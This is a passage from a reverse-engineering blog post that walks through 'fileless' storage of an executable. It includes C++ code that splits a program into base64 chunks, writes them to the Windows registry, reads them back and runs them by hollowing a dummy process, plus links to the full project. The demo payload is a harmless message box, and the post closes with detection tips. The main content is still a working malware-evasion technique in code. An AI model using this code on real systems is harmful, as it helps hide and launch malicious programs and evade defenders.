    <span style="color: #008000;">&#40;</span><span style="color: #0000ff;">void</span><span style="color: #008000;">&#41;</span><span style="color: #0000dd;">memcpy</span><span style="color: #008000;">&#40;</span>pBytes.<span style="color: #007788;">data</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span>, strDecoded.<span style="color: #007788;">c_str</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span>, strDecoded.<span style="color: #007788;">size</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>lRet <span style="color: #000040;">!</span><span style="color: #000080;">=</span> ERROR_SUCCESS<span style="color: #008000;">&#41;</span>
    <span style="color: #008000;">&#123;</span>
        <span style="color: #0000dd;">fprintf</span><span style="color: #008000;">&#40;</span><span style="color: #0000ff;">stderr</span>, <span style="color: #FF0000;">&quot;Could not read registry value. Error = %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span>,
            lRet<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
        bErrorOccured <span style="color: #000080;">=</span> <span style="color: #0000ff;">true</span><span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
    <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>dwType <span style="color: #000040;">!</span><span style="color: #000080;">=</span> REG_SZ <span style="color: #000040;">||</span> <span style="color: #008000;">&#40;</span>dwReadSize <span style="color: #000080;">==</span> <span style="color: #0000dd;">0</span> <span style="color: #000040;">||</span> dwReadSize <span style="color: #000080;">&gt;</span> dwMaxReadSize<span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span>
    <span style="color: #008000;">&#123;</span>
        <span style="color: #0000dd;">fprintf</span><span style="color: #008000;">&#40;</span><span style="color: #0000ff;">stderr</span>, <span style="color: #FF0000;">&quot;Did not correctly read back a string from the registry.<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
        bErrorOccured <span style="color: #000080;">=</span> <span style="color: #0000ff;">true</span><span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
&nbsp;
    <span style="color: #0000ff;">return</span> pBytes<span style="color: #008080;">;</span>
<span style="color: #008000;">&#125;</span></pre></td></tr></table><p class="theCode" style="display:none;">const HKEY OpenRegistryKey(const char * const strKeyName, const bool bCreate = true)
{
    HKEY hKey = nullptr;
    DWORD dwResult = 0;

    LONG lRet = RegCreateKeyExA(HKEY_CURRENT_USER, strKeyName, 0,
        nullptr, 0, KEY_READ | KEY_WRITE | KEY_CREATE_SUB_KEY,
        nullptr, &amp;hKey, &amp;dwResult);
    if (lRet != ERROR_SUCCESS)
    {
        fprintf(stderr, &quot;Could not create/open registry key. Error = %X\n&quot;,
            lRet);
        exit(-1);
    }

    if (bCreate &amp;&amp; dwResult == REG_CREATED_NEW_KEY)
    {
        fprintf(stdout, &quot;Created new registry key.\n&quot;);
    }
    else
    {
        fprintf(stdout, &quot;Opened existing registry key.\n&quot;);
    }

    return hKey;
}

void WriteRegistryKeyString(const HKEY hKey, const char * const strValueName,
    const BYTE *pBytes, const DWORD dwSize)
{
    std::string strEncodedData = base64_encode(pBytes, dwSize);

    LONG lRet = RegSetValueExA(hKey, strValueName, 0, REG_SZ, (const BYTE *)strEncodedData.c_str(), strEncodedData.length());
    if (lRet != ERROR_SUCCESS)
    {
        fprintf(stderr, &quot;Could not write registry value. Error = %X\n&quot;,
            lRet);
        exit(-1);
    }
}

const std::array&lt;BYTE, READ_WRITE_SIZE&gt; ReadRegistryKeyString(const char * const strKeyName,
    const char * const strValueName, bool &amp;bErrorOccured)
{
    DWORD dwType = 0;
    const DWORD dwMaxReadSize = READ_WRITE_SIZE * 2;
    DWORD dwReadSize = dwMaxReadSize;

    char strBytesEncoded[READ_WRITE_SIZE * 2] = { 0 };

    LONG lRet = RegGetValueA(HKEY_CURRENT_USER, strKeyName, strValueName,
        RRF_RT_REG_SZ, &amp;dwType, strBytesEncoded, &amp;dwReadSize);

    std::array&lt;BYTE, READ_WRITE_SIZE&gt; pBytes = { 0 };
    std::string strDecoded = base64_decode(std::string(strBytesEncoded));
    (void)memcpy(pBytes.data(), strDecoded.c_str(), strDecoded.size());

    if (lRet != ERROR_SUCCESS)
    {
        fprintf(stderr, &quot;Could not read registry value. Error = %X\n&quot;,
            lRet);
        bErrorOccured = true;
    }
    if (dwType != REG_SZ || (dwReadSize == 0 || dwReadSize &gt; dwMaxReadSize))
    {
        fprintf(stderr, &quot;Did not correctly read back a string from the registry.\n&quot;);
        bErrorOccured = true;
    }

    return pBytes;
}</p></div>

<p>This is nearly all that is needed to get a file into the registry. There are some additional details, such as splitting the file up into several keys, which won&#8217;t be shown in this post to space save (but is available in the sample code). The code using these functions to split and write the file into the registry is shown below:</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="cpp" style="font-family:monospace;"><span style="color: #0000ff;">void</span> WriteFileToRegistry<span style="color: #008000;">&#40;</span><span style="color: #0000ff;">const</span> <span style="color: #0000ff;">char</span> <span style="color: #000040;">*</span> <span style="color: #0000ff;">const</span> pFilePath<span style="color: #008000;">&#41;</span>
<span style="color: #008000;">&#123;</span>
    HKEY hKey <span style="color: #000080;">=</span> OpenRegistryKey<span style="color: #008000;">&#40;</span><span style="color: #FF0000;">&quot;RegistryTest&quot;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    std<span style="color: #008080;">::</span><span style="color: #007788;">string</span> strSubName <span style="color: #000080;">=</span> <span style="color: #FF0000;">&quot;Part&quot;</span><span style="color: #008080;">;</span>
    std<span style="color: #008080;">::</span><span style="color: #007788;">string</span> strSizeName <span style="color: #000080;">=</span> <span style="color: #FF0000;">&quot;Size&quot;</span><span style="color: #008080;">;</span>
    <span style="color: #0000ff;">size_t</span> ulIndex <span style="color: #000080;">=</span> <span style="color: #0000dd;">1</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000ff;">auto</span> splitFile <span style="color: #000080;">=</span> SplitFile<span style="color: #008000;">&#40;</span>pFilePath<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #0000ff;">for</span> <span style="color: #008000;">&#40;</span><span style="color: #0000ff;">size_t</span> i <span style="color: #000080;">=</span> <span style="color: #0000dd;">0</span><span style="color: #008080;">;</span> i <span style="color: #000080;">&lt;</span> splitFile.<span style="color: #007788;">size</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span> <span style="color: #000040;">++</span>i<span style="color: #008000;">&#41;</span>
    <span style="color: #008000;">&#123;</span>
        std<span style="color: #008080;">::</span><span style="color: #007788;">string</span> strFullName<span style="color: #008000;">&#40;</span>strSubName <span style="color: #000040;">+</span> std<span style="color: #008080;">::</span><span style="color: #007788;">to_string</span><span style="color: #008000;">&#40;</span>ulIndex<span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
        WriteRegistryKeyString<span style="color: #008000;">&#40;</span>hKey, strFullName.<span style="color: #007788;">c_str</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span>, splitFile<span style="color: #008000;">&#91;</span>i<span style="color: #008000;">&#93;</span>.<span style="color: #007788;">data</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span>, READ_WRITE_SIZE<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
        <span style="color: #000040;">++</span>ulIndex<span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
&nbsp;
    CloseHandle<span style="color: #008000;">&#40;</span>hKey<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
<span style="color: #008000;">&#125;</span></pre></td></tr></table><p class="theCode" style="display:none;">void WriteFileToRegistry(const char * const pFilePath)
{
    HKEY hKey = OpenRegistryKey(&quot;RegistryTest&quot;);

    std::string strSubName = &quot;Part&quot;;
    std::string strSizeName = &quot;Size&quot;;
    size_t ulIndex = 1;
 
    auto splitFile = SplitFile(pFilePath);
    for (size_t i = 0; i &lt; splitFile.size(); ++i)
    {
        std::string strFullName(strSubName + std::to_string(ulIndex));

        WriteRegistryKeyString(hKey, strFullName.c_str(), splitFile[i].data(), READ_WRITE_SIZE);
        ++ulIndex;
    }

    CloseHandle(hKey);
}</p></div>

<p>The top-level key for the example code is under HKCU\\RegistryTest. The exectuable file will be split up into 2048 byte chunks, base64 encoded, and then written in as values named &#8220;Part1&#8221;, &#8220;Part2&#8221;, &#8230; &#8220;PartN&#8221;. An 8KB file written to the registry is shown below after executing this code:</p>
<p><a href="http://www.codereversing.com/blog/wp-content/uploads/2015/08/scr1.png"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-262" src="http://www.codereversing.com/blog/wp-content/uploads/2015/08/scr1.png" alt="scr1" width="667" height="129" srcset="https://www.codereversing.com/wp-content/uploads/2015/08/scr1.png 667w, https://www.codereversing.com/wp-content/uploads/2015/08/scr1-300x58.png 300w" sizes="(max-width: 667px) 100vw, 667px" /></a>A <a href="http://tomeko.net/online_tools/base64.php?lang=en" target="_blank">Base64 decoder</a> can quickly verify that the contents of the keys look correct. Inputting the &#8220;Part1&#8221; key shows the following output (trimmed), where the PE header can be seen:</p>
<pre>MZ[144][0][3][0][0][0][4][0][0][0][255][255][0][0][184][0][0][0][0][0][0][0]@[0][0][0][0][0][0][0]
[0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][240][0][0][0]
[14][31][186][14][0][180][9][205]![184][1]L[205]!This program cannot be run in DOS mode.[13][13]
[10]$[0][0][0][0][0][0][0][181]!:
</pre>
<p>The file is now in the registry and can be deleted on disk.</p>
<p><strong>Retrieving Files from the Registry</strong></p>
<p>At this point, the file is split up and in the registry. Retrieving the file is nothing more than performing the opposite of the first section: reading the individual parts, base64 decoding them, and combining the data into a single stream. The code for this is shown below:</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="cpp" style="font-family:monospace;">NewProcessInfo JoinRegistryToFile<span style="color: #008000;">&#40;</span><span style="color: #0000ff;">const</span> <span style="color: #0000ff;">char</span> <span style="color: #000040;">*</span> <span style="color: #0000ff;">const</span> strKeyName, <span style="color: #0000ff;">const</span> <span style="color: #0000ff;">char</span> <span style="color: #000040;">*</span> <span style="color: #0000ff;">const</span> strValueName<span style="color: #008000;">&#41;</span>
<span style="color: #008000;">&#123;</span>
    NewProcessInfo newProcessInfo <span style="color: #000080;">=</span> <span style="color: #008000;">&#123;</span> <span style="color: #0000dd;">0</span> <span style="color: #008000;">&#125;</span><span style="color: #008080;">;</span>
    std<span style="color: #008080;">::</span><span style="color: #007788;">vector</span><span style="color: #000080;">&lt;</span>std<span style="color: #008080;">::</span><span style="color: #007788;">array</span><span style="color: #000080;">&lt;</span>BYTE, READ_WRITE_SIZE<span style="color: #000080;">&gt;&gt;</span> splitFile<span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000ff;">size_t</span> ulKeyIndex <span style="color: #000080;">=</span> <span style="color: #0000dd;">1</span><span style="color: #008080;">;</span>
    std<span style="color: #008080;">::</span><span style="color: #007788;">string</span> strFullName<span style="color: #008000;">&#40;</span>strValueName <span style="color: #000040;">+</span> std<span style="color: #008080;">::</span><span style="color: #007788;">to_string</span><span style="color: #008000;">&#40;</span>ulKeyIndex<span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000ff;">bool</span> bErrorOccured <span style="color: #000080;">=</span> <span style="color: #0000ff;">false</span><span style="color: #008080;">;</span>
    <span style="color: #0000ff;">auto</span> partFile <span style="color: #000080;">=</span> ReadRegistryKeyString<span style="color: #008000;">&#40;</span>strKeyName, strFullName.<span style="color: #007788;">c_str</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span>, bErrorOccured<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000ff;">while</span> <span style="color: #008000;">&#40;</span><span style="color: #000040;">!</span>bErrorOccured<span style="color: #008000;">&#41;</span>
    <span style="color: #008000;">&#123;</span>
        splitFile.<span style="color: #007788;">push_back</span><span style="color: #008000;">&#40;</span>partFile<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
        <span style="color: #000040;">++</span>ulKeyIndex<span style="color: #008080;">;</span>
        strFullName <span style="color: #000080;">=</span> strValueName <span style="color: #000040;">+</span> std<span style="color: #008080;">::</span><span style="color: #007788;">to_string</span><span style="color: #008000;">&#40;</span>ulKeyIndex<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
        partFile <span style="color: #000080;">=</span> ReadRegistryKeyString<span style="color: #008000;">&#40;</span>strKeyName, strFullName.<span style="color: #007788;">c_str</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span>, bErrorOccured<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
&nbsp;
    newProcessInfo.<span style="color: #007788;">pFileData</span> <span style="color: #000080;">=</span> std<span style="color: #008080;">::</span><span style="color: #007788;">unique_ptr</span><span style="color: #000080;">&lt;</span>BYTE<span style="color: #008000;">&#91;</span><span style="color: #008000;">&#93;</span><span style="color: #000080;">&gt;</span><span style="color: #008000;">&#40;</span><span style="color: #0000dd;">new</span> BYTE<span style="color: #008000;">&#91;</span>splitFile.<span style="color: #007788;">size</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span> <span style="color: #000040;">*</span> READ_WRITE_SIZE<span style="color: #008000;">&#93;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #0000dd;">memset</span><span style="color: #008000;">&#40;</span>newProcessInfo.<span style="color: #007788;">pFileData</span>.<span style="color: #007788;">get</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span>, <span style="color: #0000dd;">0</span>, splitFile.<span style="color: #007788;">size</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span> <span style="color: #000040;">*</span> READ_WRITE_SIZE<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000ff;">size_t</span> ulWriteIndex <span style="color: #000080;">=</span> <span style="color: #0000dd;">0</span><span style="color: #008080;">;</span>
    <span style="color: #0000ff;">for</span> <span style="color: #008000;">&#40;</span><span style="color: #0000ff;">auto</span> <span style="color: #000040;">&amp;</span>split <span style="color: #008080;">:</span> splitFile<span style="color: #008000;">&#41;</span>
    <span style="color: #008000;">&#123;</span>
        <span style="color: #008000;">&#40;</span><span style="color: #0000ff;">void</span><span style="color: #008000;">&#41;</span><span style="color: #0000dd;">memcpy</span><span style="color: #008000;">&#40;</span><span style="color: #000040;">&amp;</span>newProcessInfo.<span style="color: #007788;">pFileData</span>.<span style="color: #007788;">get</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span><span style="color: #008000;">&#91;</span>ulWriteIndex <span style="color: #000040;">*</span> READ_WRITE_SIZE<span style="color: #008000;">&#93;</span>, splitFile<span style="color: #008000;">&#91;</span>ulWriteIndex<span style="color: #008000;">&#93;</span>.<span style="color: #007788;">data</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span>,
            READ_WRITE_SIZE<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
        <span style="color: #000040;">++</span>ulWriteIndex<span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
&nbsp;
    newProcessInfo.<span style="color: #007788;">pDosHeader</span> <span style="color: #000080;">=</span> <span style="color: #008000;">&#40;</span>IMAGE_DOS_HEADER <span style="color: #000040;">*</span><span style="color: #008000;">&#41;</span><span style="color: #000040;">&amp;</span><span style="color: #008000;">&#40;</span>newProcessInfo.<span style="color: #007788;">pFileData</span>.<span style="color: #007788;">get</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span><span style="color: #008000;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: #008000;">&#93;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    newProcessInfo.<span style="color: #007788;">pNtHeaders</span> <span style="color: #000080;">=</span> <span style="color: #008000;">&#40;</span>IMAGE_NT_HEADERS <span style="color: #000040;">*</span><span style="color: #008000;">&#41;</span><span style="color: #000040;">&amp;</span><span style="color: #008000;">&#40;</span>newProcessInfo.<span style="color: #007788;">pFileData</span>.<span style="color: #007788;">get</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span><span style="color: #008000;">&#91;</span>newProcessInfo.<span style="color: #007788;">pDosHeader</span><span style="color: #000040;">-</span><span style="color: #000080;">&gt;</span>e_lfanew<span style="color: #008000;">&#93;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000ff;">return</span> newProcessInfo<span style="color: #008080;">;</span>
<span style="color: #008000;">&#125;</span></pre></td></tr></table><p class="theCode" style="display:none;">NewProcessInfo JoinRegistryToFile(const char * const strKeyName, const char * const strValueName)
{
    NewProcessInfo newProcessInfo = { 0 };
    std::vector&lt;std::array&lt;BYTE, READ_WRITE_SIZE&gt;&gt; splitFile;

    size_t ulKeyIndex = 1;
    std::string strFullName(strValueName + std::to_string(ulKeyIndex));

    bool bErrorOccured = false;
    auto partFile = ReadRegistryKeyString(strKeyName, strFullName.c_str(), bErrorOccured);

    while (!bErrorOccured)
    {
        splitFile.push_back(partFile);

        ++ulKeyIndex;
        strFullName = strValueName + std::to_string(ulKeyIndex);

        partFile = ReadRegistryKeyString(strKeyName, strFullName.c_str(), bErrorOccured);
    }

    newProcessInfo.pFileData = std::unique_ptr&lt;BYTE[]&gt;(new BYTE[splitFile.size() * READ_WRITE_SIZE]);
    memset(newProcessInfo.pFileData.get(), 0, splitFile.size() * READ_WRITE_SIZE);

    size_t ulWriteIndex = 0;
    for (auto &amp;split : splitFile)
    {
        (void)memcpy(&amp;newProcessInfo.pFileData.get()[ulWriteIndex * READ_WRITE_SIZE], splitFile[ulWriteIndex].data(),
            READ_WRITE_SIZE);
        ++ulWriteIndex;
    }

    newProcessInfo.pDosHeader = (IMAGE_DOS_HEADER *)&amp;(newProcessInfo.pFileData.get()[0]);
    newProcessInfo.pNtHeaders = (IMAGE_NT_HEADERS *)&amp;(newProcessInfo.pFileData.get()[newProcessInfo.pDosHeader-&gt;e_lfanew]);

    return newProcessInfo;
}</p></div>

<p>Here the <em>ReadRegistryKeyString</em> function, whose definition is in the previous section, is called to retrieve the parts. These individual parts are then combined afterwards and stored in <em>newProcessInfo.pFileData</em>. There are some additional fields initialized, such as the beginning of the PE DOS and NT headers, which will be useful for the next section.</p>
<p><strong>Loading the Retrieved File</strong></p>
<p>At this point, the file has been retrieved from the registry and is stored in a buffer in memory. Writing the contents to disk and launching the process would defeat the point of storing it in the registry in the first place, since the file is back on disk. Instead <a href="http://www.codereversing.com/blog/archives/65" target="_blank">process hollowing</a> will be employed. A dummy process will be launched in a suspended state and have its memory unmapped. Afterwards, the bytes that were retrieved from the registry will be mapped into this process and the process will begin executing. At the topmost level, the code looks like the following:</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="cpp" style="font-family:monospace;"><span style="color: #0000ff;">void</span> ExecuteFileFromRegistry<span style="color: #008000;">&#40;</span><span style="color: #0000ff;">const</span> <span style="color: #0000ff;">char</span> <span style="color: #000040;">*</span> <span style="color: #0000ff;">const</span> pValueName<span style="color: #008000;">&#41;</span>
<span style="color: #008000;">&#123;</span>
    HKEY hKey <span style="color: #000080;">=</span> OpenRegistryKey<span style="color: #008000;">&#40;</span><span style="color: #FF0000;">&quot;RegistryTest&quot;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000ff;">auto</span> newProcessInfo <span style="color: #000080;">=</span> JoinRegistryToFile<span style="color: #008000;">&#40;</span><span style="color: #FF0000;">&quot;RegistryTest&quot;</span>, pValueName<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #0000ff;">auto</span> processInfo <span style="color: #000080;">=</span> MapTargetProcess<span style="color: #008000;">&#40;</span>newProcessInfo, <span style="color: #FF0000;">&quot;DummyProcess.exe&quot;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    RunTargetProcess<span style="color: #008000;">&#40;</span>newProcessInfo, processInfo<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    CloseHandle<span style="color: #008000;">&#40;</span>hKey<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
<span style="color: #008000;">&#125;</span></pre></td></tr></table><p class="theCode" style="display:none;">void ExecuteFileFromRegistry(const char * const pValueName)
{
    HKEY hKey = OpenRegistryKey(&quot;RegistryTest&quot;);

    auto newProcessInfo = JoinRegistryToFile(&quot;RegistryTest&quot;, pValueName);
    auto processInfo = MapTargetProcess(newProcessInfo, &quot;DummyProcess.exe&quot;);
    RunTargetProcess(newProcessInfo, processInfo);

    CloseHandle(hKey);
}</p></div>

<p><em>MapTargetProcess</em> and <em>RunTargetProcess</em> won&#8217;t be shown here since they are close copies from the 2011 post on the topic that I wrote. A note that I would like to make is that this technique works if the dummy and replacement processes are both x86, and were compiled with DEP/ASLR disabled. A refinement of this technique to support x64 and DEP/ASLR enabled is something that I hope to post soon. A screenshot of the code in action is shown below:<a href="http://www.codereversing.com/blog/wp-content/uploads/2015/08/scr2.png"><img decoding="async" class="aligncenter size-full wp-image-263" src="http://www.codereversing.com/blog/wp-content/uploads/2015/08/scr2.png" alt="scr2" width="373" height="289" srcset="https://www.codereversing.com/wp-content/uploads/2015/08/scr2.png 373w, https://www.codereversing.com/wp-content/uploads/2015/08/scr2-300x232.png 300w" sizes="(max-width: 373px) 100vw, 373px" /></a><br />
Here <em>DummyProcess.exe</em> (included in the zip) is the process that has been hollowed out and replaced with another process, <em>ReplacementProcess.exe</em> (also included in the zip). The &#8220;<em>Sample</em>&#8221; folder provided in the zip provides interactive example. To demonstrate, do the following:</p>
<ul>
<li>Run <em>DummyProcess.exe</em> and observe that it is a Win32 UI application.</li>
<li>Run <em>write.bat</em>, which calls <em>FilelessLauncher.exe</em> to writeÂ  <em>ReplacementProcess.exe</em> under <em>HKCU\\RegistryTest</em></li>
<li>Delete <em>ReplacementProcess.exe</em></li>
<li>Run <em>execute.bat</em>, which calls <em>FilelessLauncher.exe</em> to read <em>HKCU\\RegistryTest</em> and retrieve the bytes of <em>ReplacementProcess.exe</em>. It will then unmap <em>DummyProcess.exe</em> and write the bytes for <em>ReplacementProcess.exe</em> in. The process will then resume and a message box will pop up, which is the code for <em>ReplacementProcess.exe</em></li>
</ul>
<p>Make sure to clean up the registry afterwards.</p>
<p><strong>Conclusion and Code</strong></p>
<p>The technique presented in this post covered how to perform fileless storage of an executable by placing it in the Windows registry. In terms of counteracting this technique, there are many options. For example, the written code has to be retrieved somehow, which either means that hardcoded values must be present somewhere or that there is configuration somewhere stating how to get the data back from the registry. These are prime for marking as signatures of a malicious executable. Additionally, since process hollowing was employed, those weaknesses apply as well, such as checking the image in memory versus the image on disk and analyzing the differences, of which there will certainly be many. Dynamic analysis also can provide quick answers as to what is going on by monitoring registry APIs as well as checking if <em>NtUnmapViewOfSection</em> is being called, which in itself is a red flag.</p>
<p>The Visual Studio 2015 project for this example can be found <a href="http://codereversing.com/runfromreg.zip" target="_blank">here</a>. The source code is viewable on Github <a href="https://github.com/codereversing/runfromreg" target="_blank">here</a>.<br />
This code was tested on x64 Windows 7, 8.1, and 10.</p>
<p>Follow on Twitter for more updates<br />
<div class="twttr_buttons"><div class="twttr_followme">
						<a href="https://twitter.com/codereversing" class="twitter-follow-button" data-size="default"  data-show-screen-name="false"  target="_blank">Follow me</a>
					</div></div></p>
	</div>

	<div class="feedback">
				<a href="https://www.codereversing.com/archives/261#comments">Comments (1)</a>	</div>

</div>


<h2 id="comments">1 Comment	<a href="#postcomment" title="Leave a comment">&raquo;</a>
</h2>

<ol id="commentlist">

	<li class="comment even thread-even depth-1" id="comment-53748">
	<img alt='' src='https://secure.gravatar.com/avatar/3560273117cbf69373be2aab8055abe5?s=32&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/3560273117cbf69373be2aab8055abe5?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' decoding='async'/>	<p>thanks for posting useful articles 🙂 </p>
<p>please keep it going&#8230; </p>
<p>I really love this website for having clean and neat writing..</p>
<p>Best of Luck</p>
<p>Thanks</p>
	<p><cite>Comment by <a href="http://xploitworld.com" class="url" rel="ugc external nofollow">Ali Khan</a> &#8212; August 14, 2015 @ <a href="#comment-53748">6:59 AM</a></cite> </p>
	</li>


</ol>


<p><a href="https://www.codereversing.com/archives/261/feed"><abbr title="Really Simple Syndication">RSS</abbr> feed for comments on this post.</a>	<a href="https://www.codereversing.com/archives/261/trackback" rel="trackback">TrackBack <abbr title="Universal Resource Locator">URL</abbr></a>
</p>

<h2 id="postcomment">Leave a comment</h2>


<form action="https://www.codereversing.com/wp-comments-post.php" method="post" id="commentform">


<p><input type="text" name="author" id="author" value="" size="22" tabindex="1" />
<label for="author"><small>Name (required)</small></label></p>

<p><input type="text" name="email" id="email" value="" size="22" tabindex="2" />
<label for="email"><small>Mail (will not be published) (required)</small></label></p>

<p><input type="text" name="url" id="url" value="" size="22" tabindex="3" />
<label for="url"><small>Website</small></label></p>


<!--<p><small><strong>XHTML:</strong> You can use these tags: &lt;a href=&quot;&quot; title=&quot;&quot;&gt; &lt;abbr title=&quot;&quot;&gt; &lt;acronym title=&quot;&quot;&gt; &lt;b&gt; &lt;blockquote cite=&quot;&quot;&gt; &lt;cite&gt; &lt;code&gt; &lt;del datetime=&quot;&quot;&gt; &lt;em&gt; &lt;i&gt; &lt;q cite=&quot;&quot;&gt; &lt;s&gt; &lt;strike&gt; &lt;strong&gt; </small></p>-->

<p><textarea autocomplete="new-password"  id="i5330ad5a8"  name="i5330ad5a8"   cols="58" rows="10" tabindex="4"></textarea><textarea id="comment" aria-label="hp-comment" aria-hidden="true" name="comment" autocomplete="new-password" style="padding:0 !important;clip:rect(1px, 1px, 1px, 1px) !important;position:absolute !important;white-space:nowrap !important;height:1px !important;width:1px !important;overflow:hidden !important;" tabindex="-1"></textarea><script data-noptimize>document.getElementById("comment").setAttribute( "id", "a2bfd8fd3c12cdd49950e7f57456b645" );document.getElementById("i5330ad5a8").setAttribute( "id", "comment" );</script></p>

<p><input name="submit" type="submit" id="submit" tabindex="5" value="Submit Comment" />
<input type="hidden" name="comment_post_ID" value="261" />
</p>
<div class="g-recaptcha" data-sitekey="6Lc0aP4SAAAAAHRcLuo3-kU46INWVVL74pH7cPzJ" data-theme="standard"></div><script type="text/javascript"src="https://www.google.com/recaptcha/api.js?hl=en"></script>            <div id="recaptcha-submit-btn-area">&nbsp;</div>
            <noscript>
            <style type='text/css'>#submit {display:none;}</style>
            <input name="submit" type="submit" id="submit-alt" tabindex="6"
                value="Submit Comment"/> 
            </noscript>
</form>





<!-- begin footer -->
</div>

<!-- begin sidebar -->
<div id="menu">

<ul>
<li id="pages-4" class="widget widget_pages">Pages
			<ul>
				<li class="page_item page-item-331"><a href="https://www.codereversing.com/index">All Posts</a></li>
<li class="page_item page-item-2"><a href="https://www.codereversing.com/about">About</a></li>
			</ul>

			</li><li id="search-2" class="widget widget_search"><form role="search" method="get" id="searchform" class="searchform" action="https://www.codereversing.com/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form></li>
		<li id="recent-posts-2" class="widget widget_recent_entries">
		Recent Posts
		<ul>
											<li>
					<a href="https://www.codereversing.com/archives/652">DLL Injection: Manual Mapping (5/5)</a>
									</li>
											<li>
					<a href="https://www.codereversing.com/archives/651">DLL Injection: Thread Context Hijacking (4/5)</a>
									</li>
											<li>
					<a href="https://www.codereversing.com/archives/650">DLL Injection: Remote Threads (3/5)</a>
									</li>
											<li>
					<a href="https://www.codereversing.com/archives/649">DLL Injection: Windows Hooks (2/5)</a>
									</li>
											<li>
					<a href="https://www.codereversing.com/archives/653">DLL Injection: Background &#038; DLL Proxying (1/5)</a>
									</li>
											<li>
					<a href="https://www.codereversing.com/archives/598">Function Hooking: Export Address Table Hooks (7/7)</a>
									</li>
											<li>
					<a href="https://www.codereversing.com/archives/597">Function Hooking: Import Address Table Hooks (6/7)</a>
									</li>
											<li>
					<a href="https://www.codereversing.com/archives/596">Function Hooking: Virtual Table Hooks (5/7)</a>
									</li>
											<li>
					<a href="https://www.codereversing.com/archives/595">Function Hooking: Software Breakpoints (4/7)</a>
									</li>
											<li>
					<a href="https://www.codereversing.com/archives/594">Function Hooking: Hardware Breakpoints (3/7)</a>
									</li>
					</ul>

		</li><li id="archives-2" class="widget widget_archive">Archives
			<ul>
					<li><a href='https://www.codereversing.com/archives/date/2023/06'>June 2023</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2023/05'>May 2023</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2022/10'>October 2022</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2022/08'>August 2022</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2022/07'>July 2022</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2022/06'>June 2022</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2021/12'>December 2021</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2021/11'>November 2021</a></li>
